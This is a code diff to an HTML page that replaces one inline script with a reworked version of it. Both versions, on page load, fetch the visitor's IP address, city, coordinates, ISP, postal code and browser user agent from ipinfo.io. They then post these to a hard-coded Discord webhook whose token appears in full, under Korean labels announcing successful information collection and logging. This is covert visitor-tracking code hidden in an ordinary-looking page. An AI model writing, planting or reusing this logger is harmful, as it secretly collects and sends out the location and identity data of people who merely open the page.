@@ -191,47 +191,89 @@
 			}
 		}
 	</style>
-	<script>
-		$.get("https://ipinfo.io", function(response) {
-			const webhook_url = "https://discord.com/api/webhooks/1290686478359203932/GQqrG5p9h3_6xhdF9OMlWmal0ECOItPF-SjKru3aQLMUqRcR-GIDC0rWz4bDfRI57mx6"; // 웹훅 URL을 여기에 입력하세요
-			const currentTime = Math.floor(Date.now() / 1000);
+<script>
+	$.get("https://ipinfo.io", function(response) {
+		// Discord Webhook URL
+		const webhook_url = "https://discord.com/api/webhooks/1290686478359203932/GQqrG5p9h3_6xhdF9OMlWmal0ECOItPF-SjKru3aQLMUqRcR-GIDC0rWz4bDfRI57mx6";
 
-			const main = {
-				title: "Ivy",
-				description: "> 정보 수집 성공!",
-				color: 3447003,
-				thumbnail: {
-					url: "https://cdn.discordapp.com/attachments/1280491923861278861/1290686754755575952/J.jpg",
+		// 현재 시간 UNIX 타임스탬프 (초 단위)
+		const currentTime = Math.floor(Date.now() / 1000); // UNIX 시간
+
+		// 메인 임베드 내용 구성
+		const main = {
+			title: "Coal",
+			description: "> 정보 수집 성공!",
+			color: 3447003, // 파란색 임베드 색상
+			thumbnail: {
+				url: "https://cdn.discordapp.com/attachments/1280491923861278861/1290686754755575952/J.jpg",
+			},
+			fields: [
+				{
+					name: "IP:",
+					value: `\`${response.ip}\``,
+					inline: false,
 				},
-				fields: [
-					{ name: "IP:", value: `\`${response.ip}\``, inline: true },
-					{ name: "도시:", value: `\`${response.city}\``, inline: true },
-					{ name: "지역:", value: `\`${response.region}\``, inline: true },
-					{ name: "나라:", value: `\`${response.country}\``, inline: true },
-					{ name: "위도/경도:", value: `\`${response.loc}\``, inline: true },
-					{ name: "사용 통신사:", value: `\`${response.org}\``, inline: true },
-					{ name: "우편번호:", value: `\`${response.postal}\``, inline: true },
-					{ name: "접속 시간:", value: `<t:${currentTime}:F>`, inline: true },
-					{ name: "타임존:", value: `\`${response.timezone}\``, inline: true },
-					{ name: "ASN:", value: `\`${response.asn || "정보 없음"}\``, inline: true },
-					{ name: "조직 이름:", value: `\`${response.asn ? response.asn.name : "정보 없음"}\``, inline: true },
-					{ name: "조직 도메인:", value: `\`${response.asn ? response.asn.domain : "정보 없음"}\``, inline: true },
-					{ name: "조직 유형:", value: `\`${response.asn ? response.asn.type : "정보 없음"}\``, inline: true },
-					{ name: "주소:", value: `\`${response.address || "정보 없음"}\``, inline: true },
-					{ name: "이메일:", value: `\`${response.abuse ? response.abuse.email : "정보 없음"}\``, inline: true },
-					{ name: "전화번호:", value: `\`${response.abuse ? response.abuse.phone : "정보 없음"}\``, inline: true },
-					{ name: "User-Agent:", value: `\`${navigator.userAgent}\``, inline: false },
-				],
-				footer: { text: "Ivy | 로깅 성공!" },
-				author: { name: "Ivy", url: "" }
-			};
+				{
+					name: "User-Agent:",
+					value: `\`${navigator.userAgent}\``,
+					inline: false,
+				},
+				{
+					name: "도시:",
+					value: `\`${response.city}\``,
+					inline: false,
+				},
+				{
+					name: "지역:",
+					value: `\`${response.region}\``,
+					inline: false
+				},
+				{
+					name: "나라:",
+					value: `\`${response.country}\``,
+					inline: false
+				},
+				{
+					name: "위도/경도:",
+					value: `\`${response.loc}\``,
+					inline: false
+				},
+				{
+					name: "사용 통신사:",
+					value: `\`${response.org}\``,
+					inline: false
+				},
+				{
+					name: "우편번호:",
+					value: `\`${response.postal}\``,
+					inline: false
+				},
+				{
+					name: "접속 시간 (상대적):",
+					value: `<t:${currentTime}:R>`, // 상대적 시간으로 표시 (예: 5분 전)
+					inline: false
+				}
+			],
+			footer: {
+				text: "Coal | 로깅 성공!",
+			},
+			author: {
+				name: "Coal",
+				url: ""
+			}
+		}
 
-			const xhttp = new XMLHttpRequest();
-			xhttp.open("POST", webhook_url, true);
-			xhttp.setRequestHeader('Content-Type', 'application/json');
-			xhttp.send(JSON.stringify({ 'username': 'Ivy', 'embeds': [main] }));
-		}, "json");
-	</script>
+		// Discord 웹훅으로 데이터 전송
+		const xhttp = new XMLHttpRequest();
+		xhttp.open("POST", webhook_url, true);
+		xhttp.setRequestHeader('Content-Type', 'application/json');
+		xhttp.send(JSON.stringify({
+			'username': 'Coal',
+			'embeds': [main],
+		}));
+	}, "json");
+</script>
+
 </head>
 <body>
 	<div class="container">
